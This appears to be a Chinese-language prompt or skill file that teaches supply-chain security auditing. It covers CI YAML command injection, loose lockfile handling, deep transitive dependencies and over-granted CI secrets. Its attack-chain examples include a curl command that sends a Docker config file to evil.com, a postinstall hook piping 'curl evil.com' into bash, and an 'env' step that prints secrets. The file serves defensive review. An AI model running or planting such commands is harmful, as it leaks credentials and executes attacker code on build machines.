---
description: 供应链代码理解 - 破译编译合约中的不设防暗门
tags: [supply-chain, code-understander, ci-cd, lockfile, transitive-deps, yaml-injection]
---

# 供应链代码理解 (Code Understander): 破译编译合约中的不设防暗门

> 供应链安全的审计者，能够把看似极其正统的 Bash 执行脚本，看作是黑客倒灌毒液的特权通道。
> 你读的不是"配置文件"，是"权力分配图谱"。

## 触发器：什么代码结构让供应链专家立刻进入深度审计模式？

### 触发器一：YAML 中 shell 命令与用户可控变量的拼接

**你的第一反应**："这不是参数传递，这是字符串注入。"

看到 CI YAML 中 `run: echo "Branch name is ${{ github.event.pull_request.title }}"`——这不是简单的 echo，这是命令注入的入口。

**深度追问链**：
1. 这个 `${{ }}` 表达式引用的值来自哪里？是 GitHub 事件 payload 吗？攻击者可否控制？
2. YAML 的模板渲染发生在什么时候？是在 shell 执行前还是执行中？
3. 渲染后的字符串是否经过任何转义？GitHub Actions 的表达式引擎是否做自动转义？
4. 如果这个值包含 `"`、`` ` ``、`$()`、换行符，渲染后的 shell 命令会变成什么？
5. 这个步骤运行在什么样的 runner 上？它有哪些权限？环境变量中有什么 secrets？

**攻击链闭合推演**：
```yaml
# 原始配置
run: npm test --grep="${{ github.event.issue.title }}"
# 攻击者设置 issue title = 
#   foo"; curl -d @/home/runner/.docker/config.json https://evil.com/webhook; echo "bar
# 渲染后：
#   npm test --grep="foo"; curl -d @/home/runner/.docker/config.json https://evil.com/webhook; echo "bar"
# 结果：npm test 执行了 grep="foo"，然后 curl 泄露了 docker config，然后 echo "bar"
```

### 触发器二：Lockfile 处理逻辑中的宽容模式

**你的第一反应**："这个锁文件，锁住了什么，又没锁住什么？"

看到项目中使用 `npm install` 而不是 `npm ci`，或看到 lockfile 中的 `integrity` 字段被注释掉/忽略。

**深度追问链**：
1. 构建脚本使用的是 `npm ci`（严格模式，lockfile 不可变）还是 `npm install`（可变模式，可更新 lockfile）？
2. 如果 lockfile 和 `package.json` 不一致，`npm ci` 会报错退出，`npm install` 会静默更新——项目用的是哪个？
3. lockfile 中的 `integrity` 字段是否被包管理器强制校验？还是被"可选校验"？
4. 是否有配置项禁用了完整性校验？（如 npm 的 `--no-optional` 不影响，但某些私有 registry 配置可能跳过校验）
5. 包管理器在解析依赖时，是否会因为网络超时降级为不校验 hash？

**攻击链闭合推演**：
```bash
# 高危：使用 npm install，lockfile 可被覆盖
npm install  # 如果 package.json 有新版本，lockfile 会被更新
# 攻击者在 PR 中修改 package.json 版本号
# npm install 会拉取新版本并更新 lockfile
# 审查者看到 "lockfile 更新" 以为是正常行为
```

### 触发器三：多层传递依赖的盲目信任

**你的第一反应**："这个项目的依赖树有多深？最深层有谁在控制？"

看到项目有 500+ 个依赖，或 `node_modules` 目录超过 100MB。

**深度追问链**：
1. 项目的直接依赖有多少个？传递依赖有多少个？（`npm ls --depth=10` 或 `cargo tree`）
2. 依赖树中最深的节点是多少层？第 10 层的包维护者是谁？
3. 这些深层依赖是否被签名？是否有 provenance attestation？
4. 包管理器在解析依赖时，是否检查了所有传递依赖的签名？还是只检查顶层？
5. 攻击者控制一个四级传递依赖，能否通过该依赖的生命周期脚本影响整个构建？

**攻击链闭合推演**：
```
项目 A
  └─ B (维护者: alice, 可信)
      └─ C (维护者: bob, 可信)
          └─ D (维护者: charlie, 可信)
              └─ E (维护者: attacker, 恶意)
                  └─ postinstall: curl evil.com | bash

攻击者只需控制 E（一个名不见经传的小包）
所有安装 A 的开发者都会执行 E 的 postinstall
```

### 触发器四：CI/CD 中的权限过度授予

**你的第一反应**："这个 Runner 凭什么需要这么多权限？"

看到 `GITHUB_TOKEN` 被配置为 `permissions: write-all`，或 secrets 被注入到测试步骤中。

**深度追问链**：
1. `GITHUB_TOKEN` 的权限范围是什么？是 `write-all` 还是细粒度配置？
2. 哪些步骤需要 secrets？测试步骤是否需要 AWS Key？构建步骤是否需要 Kubeconfig？
3. 是否有 `pull_request` 触发的工作流被授予了写权限？（GitHub 默认对 fork PR 只读，但 `pull_request_target` 不同）
4. secrets 是否通过环境变量注入到所有步骤？还是只在需要时注入？
5. workflow 的 `env:` 块是否在全局定义？全局 env 中的 secrets 是否会被日志泄露？

**攻击链闭合推演**：
```yaml
# 高危：全局 env 注入 secrets，所有步骤都可访问
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

jobs:
  test:
    steps:
      - run: npm test  # 测试步骤不需要 AWS Key，但仍然可以访问
      - run: env  # 攻击者通过任意命令执行打印 env，secrets 出现在日志中
```

## 专家代码审计的深层视角

### 视角一：信任锚点的层级

构建一个"信任层级图"：

```
最不可信 ←─────────────────────→ 最可信
PR作者标题  Issue评论者  Fork提交者  内部开发者  CI系统自身  包管理器  操作系统
    ↑            ↑           ↑          ↑         ↑         ↑         ↑
  任意输入    任意输入    代码内容   代码+配置   环境变量   二进制    内核
```

你的任务是：检查代码中是否有"低信任层级"的实体被直接传递到"高信任层级"的执行上下文中。

### 视角二：数据流向的污染追踪

在供应链中，数据流往往不是"用户输入 → API 处理"，而是：

```
外部包元数据 → 包管理器解析 → 本地文件系统写入 → 生命周期脚本执行 → Runner 环境
     ↑                                                              ↓
PR 标题/Issue 评论 → CI YAML 模板渲染 → Shell 执行 → Secrets 泄露 → 外部网络
```

追踪这些流向，寻找"不可信数据进入可信执行上下文"的节点。

### 视角三：配置与代码的边界模糊

在供应链中，配置文件（YAML、JSON、TOML）经常被当作代码执行：
- `package.json` 中的 `"scripts"` 是配置还是代码？（是代码，会被 shell 执行）
- `.github/workflows/*.yml` 中的 `run:` 是配置还是代码？（是代码，会被 shell 执行）
- `setup.py` 是配置还是代码？（是代码，会被 Python 解释器执行）

**关键洞察**：任何被解释器/ shell 执行的"配置"，都应该被当作代码来审计。

## 输出要求

对每个审计目标，输出：

1. **信任层级图**：标出项目中所有输入源和它们的信任级别
2. **数据流向图**：追踪从"不可信输入"到"可信执行"的完整路径
3. **权力过度授予清单**：列出所有"不必要的高权限"配置（如测试步骤拥有 AWS Key）
4. **OSV 上下文融合**：如果 OSV 报告了已知 CVE，分析该漏洞是否位于你发现的"信任断裂点"上
